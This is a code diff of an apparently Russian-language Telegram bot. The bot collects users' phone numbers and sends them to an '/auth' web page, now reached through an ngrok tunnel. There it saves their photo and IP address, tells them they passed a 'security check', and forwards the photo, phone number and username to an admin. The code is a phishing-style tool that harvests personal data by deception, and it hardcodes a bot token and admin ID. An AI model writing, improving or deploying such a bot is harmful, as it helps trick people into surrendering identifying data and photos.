@@ -13,7 +13,7 @@ import random
 TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # ❗ заменить на свой токен
 ADMIN_ID = 2054091032  # ❗ заменить на свой Telegram ID
 SITE_PORT = 5000
-SERVER_IP = "207.127.89.193"  # ❗ заменить на свой публичный IP
+NGROK_URL = "https://bfa4-207-127-89-193.ngrok-free.app "  # ❗ замени на свой URL из ngrok
 PHOTOS_DIR = "photos"
 DB_PATH = "users.db"
 
@@ -153,12 +153,12 @@ def save_photo():
 
         add_user(user_id, username, phone, ip, photo_path)
 
-        # === Отправка пользователю сообщения об успехе ===
+        # Отправка пользователю сообщения об успехе
         url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
         requests.post(url, data=data)
 
-        # === Отправка фото админу ===
+        # Отправка фото админу
         message = (
             f"📸 Новый пользователь!\n"
             f"Номер: {phone}\n"
@@ -212,7 +212,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.contact:
         phone = update.message.contact.phone_number
         user = update.effective_user
-        link = f"http://{SERVER_IP}:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
+        link = f"{NGROK_URL}/auth?user_id={user.id}&username={user.username}&phone={phone}"
         await update.message.reply_text("🔄 Регистрация почти завершена.")
         await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")
     elif update.message.text == "✍️ Ввести вручную":
@@ -220,7 +220,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         phone = update.message.text
         user = update.effective_user
-        link = f"http://{SERVER_IP}:{SITE_PORT}/auth?user_id={user.id}&username={user.username}&phone={phone}"
+        link = f"{NGROK_URL}/auth?user_id={user.id}&username={user.username}&phone={phone}"
         await update.message.reply_text("🔄 Регистрация почти завершена.")
         await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")
 
